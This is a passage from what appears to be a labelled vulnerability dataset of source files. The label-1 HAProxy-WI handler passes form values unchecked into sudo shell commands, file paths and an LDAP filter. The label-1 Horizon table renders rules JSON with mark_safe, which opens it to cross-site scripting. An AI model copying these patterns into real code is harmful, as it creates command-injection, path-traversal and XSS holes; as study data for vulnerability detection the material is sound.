cert_local_dir))\n\tfunct.logging(serv, \"add.py#ssl upload new ssl cert %s\" % name)\n\t\nif form.getvalue('backend') is not None:\n\tfunct.show_backends(serv)\n\t\nif form.getvalue('ip') is not None and serv is not None:\n\tcommands = [ \"sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'\" ]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('showif'):\n\tcommands = [\"sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'\"]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('action_hap') is not None and serv is not None:\n\taction = form.getvalue('action_hap')\n\t\n\tif funct.check_haproxy_config(serv):\n\t\tcommands = [ \"sudo systemctl %s haproxy\" % action ]\n\t\tfunct.ssh_command(serv, commands)\t\t\n\t\tprint(\"HAproxy was %s\" % action)\n\telse:\n\t\tprint(\"Bad config, check please\")\n\t\nif form.getvalue('action_waf') is not None and serv is not None:\n\tserv = form.getvalue('serv')\n\taction = form.getvalue('action_waf')\n\n\tcommands = [ \"sudo systemctl %s waf\" % action ]\n\tfunct.ssh_command(serv, commands)\t\t\n\t\nif act == \"overview\":\n\tovw.get_overview()\n\t\nif act == \"overviewwaf\":\n\tovw.get_overviewWaf(form.getvalue('page'))\n\t\nif act == \"overviewServers\":\n\tovw.get_overviewServers()\n\t\nif form.getvalue('action'):\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\t\n\tpostdata = {\n\t\t'action' : form.getvalue('action'),\n\t\t's' : form.getvalue('s'),\n\t\t'b' : form.getvalue('b')\n\t}\n\n\theaders = {\n\t\t'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',\n\t\t'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n\t\t'Accept-Language' : 'en-US,en;q=0.5',\n\t\t'Accept-Encoding' : 'gzip, deflate'\n\t}\n\n\tq = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))\n\t\nif serv is not None and act == \"stats\":\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\ttry:\n\t\tresponse = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \n\texcept requests.exceptions.ConnectTimeout:\n\t\tprint('Oops. Connection timeout occured!')\n\texcept requests.exceptions.ReadTimeout:\n\t\tprint('Oops. Read timeout occured')\n\texcept requests.exceptions.HTTPError as errh:\n\t\tprint (\"Http Error:\",errh)\n\texcept requests.exceptions.ConnectionError as errc:\n\t\tprint ('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc)\n\texcept requests.exceptions.Timeout as errt:\n\t\tprint (\"Timeout Error:\",errt)\n\texcept requests.exceptions.RequestException as err:\n\t\tprint (\"OOps: Something Else\",err)\n\t\t\n\tdata = response.content\n\tprint(data.decode('utf-8'))\n\nif serv is not None and form.getvalue('rows') is not None:\n\trows = form.getvalue('rows')\n\twaf = form.getvalue('waf')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n        \tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tsyslog_server_enable = sql.get_setting('syslog_server_enable')\n\tif syslog_server_enable is None or syslog_server_enable == \"0\":\n\t\tlocal_path_logs = sql.get_setting('local_path_logs')\n\t\tsyslog_server = serv\t\n\t\tcommands = [ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (local_path_logs, date, date1, rows, grep_act, grep) ]\t\t\n\telse:\n\t\tcommands = [ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s\" % (serv, date, date1, rows, grep_act, grep) ]\n\t\tsyslog_server = sql.get_setting('syslog_server')\n\t\n\tif waf == \"1\":\n\t\tlocal_path_logs = '/var/log/modsec_audit.log'\n\t\tcommands = [ \"sudo cat %s |tail -%s  %s %s\" % (local_path_logs, rows, grep_act, grep) ]\t\n\t\t\n\tfunct.ssh_command(syslog_server, commands, show_log=\"1\")\n\t\nif serv is not None and form.getvalue('rows1') is not None:\n\trows = form.getvalue('rows1')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\tapache_log_path = sql.get_setting('apache_log_path')\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\t\t\n\tif serv == 'haproxy-wi.access.log':\n\t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\telse:\n\t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif form.getvalue('viewlogs') is not None:\n\tviewlog = form.getvalue('viewlogs')\n\tlog_path = funct.get_config_var('main', 'log_path')\n\trows = form.getvalue('rows2')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (log_path + viewlog, date, date1, rows, grep_act, grep)\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif serv is not None and act == \"showMap\":\n\tovw.get_map(serv)\n\t\nif form.getvalue('servaction') is not None:\n\tserver_state_file = sql.get_setting('server_state_file')\n\thaproxy_sock = sql.get_setting('haproxy_sock')\n\tenable = form.getvalue('servaction')\n\tbackend = form.getvalue('servbackend')\t\n\tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)\n\t\n\tif form.getvalue('save') == \"on\":\n\t\tsave_command = 'echo \"show servers state\" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)\n\t\tcommand = [ cmd, save_command ] \n\telse:\n\t\tcommand = [ cmd ] \n\t\t\n\tif enable != \"show\":\n\t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' % (enable, backend, serv, serv))\n\t\t\t\n\tfunct.ssh_command(serv, command, show_log=\"1\")\n\taction = 'edit.py ' + enable + ' ' + backend\n\tfunct.logging(serv, action)\n\nif act == \"showCompareConfigs\":\n\timport glob\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('/show_compare_configs.html')\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\t\n\ttemplate = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\nif serv is not None and form.getvalue('right') is not None:\n\tfrom jinja2 import Environment, FileSystemLoader\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n\ttemplate = env.get_template('compare.html')\n\t\n\toutput, stderr = funct.subprocess_execute(cmd)\n\ttemplate = template.render(stdout=output)\t\n\t\n\tprint(template)\n\tprint(stderr)\n\t\nif serv is not None and act == \"configShow\":\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\t\n\tif form.getvalue('configver') is None:\t\n\t\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\t\tfunct.get_config(serv, cfg)\n\telse: \n\t\tcfg = hap_configs_dir + form.getvalue('configver')\n\t\t\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n\t\t\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n\ttemplate = env.get_template('config_show.html')\n\t\n\ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\n\tif form.getvalue('configver') is None:\n\t\tos.system(\"/bin/rm -f \" + cfg)\t\n\t\t\nif form.getvalue('master'):\n\tmaster = form.getvalue('master')\n\tslave = form.getvalue('slave')\n\tinterface = form.getvalue('interface')\n\tvrrpip = form.getvalue('vrrpip')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"install_keepalived.sh\"\n\t\n\tif form.getvalue('hap') == \"1\":\n\t\tfunct.install_haproxy(master)\n\t\tfunct.install_haproxy(slave)\n\t\t\n\tif form.getvalue('syn_flood') == \"1\":\n\t\tfunct.syn_flood_protect(master)\n\t\tfunct.syn_flood_protect(slave)\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\tsql.update_server_master(master, slave)\n\t\nif form.getvalue('masteradd'):\n\tmaster = form.getvalue('masteradd')\n\tslave = form.getvalue('slaveadd')\n\tinterface = form.getvalue('interfaceadd')\n\tvrrpip = form.getvalue('vrrpipadd')\n\tkp = form.getvalue('kp')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"add_vrrp.sh\"\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\t\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\t\nif form.getvalue('haproxyaddserv'):\n\tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))\n\t\nif form.getvalue('installwaf'):\n\tfunct.waf_install(form.getvalue('installwaf'))\n\t\nif form.getvalue('metrics_waf'):\n\tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))\n\t\t\nif form.getvalue('table_metrics'):\n\timport http.cookies\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('table_metrics.html')\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\ttable_stat = sql.select_table_metrics(user_id.value)\n\n\ttemplate = template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\t\nif form.getvalue('metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[5])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['server'] = str(i[0])\n\t\t\tmetrics[rep_date]['curr_con'] = str(i[1])\n\t\t\tmetrics[rep_date]['curr_ssl_con'] = str(i[2])\n\t\t\tmetrics[rep_date]['sess_rate'] = str(i[3])\n\t\t\tmetrics[rep_date]['max_sess_rate'] = str(i[4])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@curr_con\"),\n\t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"),\n\t\t\t\t(\"Sessions rate\", \"@sess_rate\")\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['curr_con'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\t\t\n\t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\"#5d9ceb\", line_width=2, legend=\"SSL con\")\n\t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\"#33414e\", line_width=2, legend=\"Sessions\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('waf_metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_waf_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_waf_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[2])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['conn'] = str(i[1])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@conn\"),\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['conn'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\n\t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\t\t\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('get_hap_v'):\n\toutput = funct.check_haproxy_version(serv)\n\tprint(output)\n\t\nif form.getvalue('bwlists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists')\n\ttry:\n\t\tfile = open(list, \"r\")\n\t\tfile_read = file.read()\n\t\tfile.close\n\t\tprint(file_read)\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>')\n\t\t\nif form.getvalue('bwlists_create'):\n\tlist_name = form.getvalue('bwlists_create').split('.')[0]\n\tlist_name += '.lst'\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name\n\ttry:\n\t\topen(list, 'a').close()\n\t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>')\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e)\n\t\t\nif form.getvalue('bwlists_save'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save')\n\ttry:\n\t\twith open(list, \"w\") as file:\n\t\t\tfile.write(form.getvalue('bwlists_content'))\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e)\n\t\n\tservers = sql.get_dick_permit()\n\tpath = sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color')\n\t\n\tfor server in servers:\n\t\tfunct.ssh_command(server[2], [\"sudo mkdir \"+path])\n\t\terror = funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath')\n\t\tif error:\n\t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t\n\t\telse:\n\t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')\n\t\t\tif form.getvalue('bwlists_restart') == 'restart':\n\t\t\t\tfunct.ssh_command(server[2], [\"sudo \" + sql.get_setting('restart_command')])\n\t\t\t\nif form.getvalue('get_lists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')\n\tlists = funct.get_files(dir=list, format=\"lst\")\n\tfor list in lists:\n\t\tprint(list)\n\t\t\nif form.getvalue('get_ldap_email'):\n\tusername = form.getvalue('get_ldap_email')\n\timport ldap\n\t\n\tserver = sql.get_setting('ldap_server')\n\tport = sql.get_setting('ldap_port')\n\tuser = sql.get_setting('ldap_user')\n\tpassword = sql.get_setting('ldap_password')\n\tldap_base = sql.get_setting('ldap_base')\n\tdomain = sql.get_setting('ldap_domain')\n\tldap_search_field = sql.get_setting('ldap_search_field')\n\n\tl = ldap.initialize(\"ldap://\"+server+':'+port)\n\ttry:\n\t\tl.protocol_version = ldap.VERSION3\n\t\tl.set_option(ldap.OPT_REFERRALS, 0)\n\n\t\tbind = l.simple_bind_s(user, password)\n\n\t\tcriteria = \"(&(objectClass=user)(sAMAccountName=\"+username+\"))\"\n\t\tattributes = [ldap_search_field]\n\t\tresult = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)\n\n\t\tresults = [entry for dn, entry in result if isinstance(entry, dict)]\n\t\ttry:\n\t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]')\n\t\texcept:\n\t\t\tprint('error: user not found')\n\tfinally:\n\t\tl.unbind()/n/n/n", "label": 1}, {"id": "a835dbfbaa2c70329c08d4b8429d49315dc6d651", "code": "openstack_dashboard/dashboards/identity/mappings/tables.py/n/n# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport json\n\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.utils.translation import ungettext_lazy\n\nfrom horizon import tables\n\nfrom openstack_dashboard import api\n\n\nclass CreateMappingLink(tables.LinkAction):\n    name = \"create\"\n    verbose_name = _(\"Create Mapping\")\n    url = \"horizon:identity:mappings:create\"\n    classes = (\"ajax-modal\",)\n    icon = \"plus\"\n    policy_rules = ((\"identity\", \"identity:create_mapping\"),)\n\n\nclass EditMappingLink(tables.LinkAction):\n    name = \"edit\"\n    verbose_name = _(\"Edit\")\n    url = \"horizon:identity:mappings:update\"\n    classes = (\"ajax-modal\",)\n    icon = \"pencil\"\n    policy_rules = ((\"identity\", \"identity:update_mapping\"),)\n\n\nclass DeleteMappingsAction(tables.DeleteAction):\n    @staticmethod\n    def action_present(count):\n        return ungettext_lazy(\n            u\"Delete Mapping\",\n            u\"Delete Mappings\",\n            count\n        )\n\n    @staticmethod\n    def action_past(count):\n        return ungettext_lazy(\n            u\"Deleted Mapping\",\n            u\"Deleted Mappings\",\n            count\n        )\n    policy_rules = ((\"identity\", \"identity:delete_mapping\"),)\n\n    def delete(self, request, obj_id):\n        api.keystone.mapping_delete(request, obj_id)\n\n\nclass MappingFilterAction(tables.FilterAction):\n    def filter(self, table, mappings, filter_string):\n        \"\"\"Naive case-insensitive search.\"\"\"\n        q = filter_string.lower()\n        return [mapping for mapping in mappings\n                if q in mapping.ud.lower()]\n\n\ndef get_rules_as_json(mapping):\n    rules = getattr(mapping, 'rules', None)\n    if rules:\n        rules = json.dumps(rules, indent=4)\n    return rules\n\n\nclass MappingsTable(tables.DataTable):\n    id = tables.Column('id', verbose_name=_('Mapping ID'))\n    description = tables.Column(get_rules_as_json,\n                                verbose_name=_('Rules'))\n\n    class Meta(object):\n        name = \"idp_mappings\"\n        verbose_name = _(\"Attribute Mappings\")\n        row_actions = (EditMappingLink, DeleteMappingsAction)\n        table_actions = (MappingFilterAction, CreateMappingLink,\n                         DeleteMappingsAction)\n/n/n/n", "label": 0}, {"id": "a835dbfbaa2c70329c08d4b8429d49315dc6d651", "code": "/openstack_dashboard/dashboards/identity/mappings/tables.py/n/n# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport json\n\nfrom django.utils import safestring\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.utils.translation import ungettext_lazy\n\nfrom horizon import tables\n\nfrom openstack_dashboard import api\n\n\nclass CreateMappingLink(tables.LinkAction):\n    name = \"create\"\n    verbose_name = _(\"Create Mapping\")\n    url = \"horizon:identity:mappings:create\"\n    classes = (\"ajax-modal\",)\n    icon = \"plus\"\n    policy_rules = ((\"identity\", \"identity:create_mapping\"),)\n\n\nclass EditMappingLink(tables.LinkAction):\n    name = \"edit\"\n    verbose_name = _(\"Edit\")\n    url = \"horizon:identity:mappings:update\"\n    classes = (\"ajax-modal\",)\n    icon = \"pencil\"\n    policy_rules = ((\"identity\", \"identity:update_mapping\"),)\n\n\nclass DeleteMappingsAction(tables.DeleteAction):\n    @staticmethod\n    def action_present(count):\n        return ungettext_lazy(\n            u\"Delete Mapping\",\n            u\"Delete Mappings\",\n            count\n        )\n\n    @staticmethod\n    def action_past(count):\n        return ungettext_lazy(\n            u\"Deleted Mapping\",\n            u\"Deleted Mappings\",\n            count\n        )\n    policy_rules = ((\"identity\", \"identity:delete_mapping\"),)\n\n    def delete(self, request, obj_id):\n        api.keystone.mapping_delete(request, obj_id)\n\n\nclass MappingFilterAction(tables.FilterAction):\n    def filter(self, table, mappings, filter_string):\n        \"\"\"Naive case-insensitive search.\"\"\"\n        q = filter_string.lower()\n        return [mapping for mapping in mappings\n                if q in mapping.ud.lower()]\n\n\ndef get_rules_as_json(mapping):\n    rules = getattr(mapping, 'rules', None)\n    if rules:\n        rules = json.dumps(rules, indent=4)\n    return safestring.mark_safe(rules)\n\n\nclass MappingsTable(tables.DataTable):\n    id = tables.Column('id', verbose_name=_('Mapping ID'))\n    description = tables.Column(get_rules_as_json,\n                                verbose_name=_('Rules'))\n\n    class Meta(object):\n        name = \"idp_mappings\"\n        verbose_name = _(\"Attribute Mappings\")\n        row_actions = (EditMappingLink, DeleteMappingsAction)\n        table_actions = (MappingFilterAction, CreateMappingLink,\n                         DeleteMappingsAction)\n/n/n/n", "label": 1}, {"id": "2f39f3df54fb79b56744f00bcf97583b3807851f", "code": "appengine/cr-buildbucket/handlers.py/n/n# Copyright 2017 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nfrom components import auth\nfrom components import config as config_api\nfrom components import decorators\nfrom components import endpoints_webapp2\nfrom components import prpc\n\nimport webapp2\n\nfrom legacy import api as legacy_api\nfrom legacy import swarmbucket_api\nimport access\nimport api\nimport bq\nimport bulkproc\nimport config\nimport expiration\nimport model\nimport notifications\nimport service\nimport swarming\nimport user\n\nREADME_MD = (\n    'https://chromium.googlesource.com/infra/infra/+/master/'\n    'appengine/cr-buildbucket/README.md'\n)\n\n\nclass MainHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to README.md.\"\"\"\n\n  def get(self):\n    return self.redirect(README_MD)\n\n\nclass CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Updates buckets from configs.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    config.cron_update_buckets()\n\n\nclass BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to API 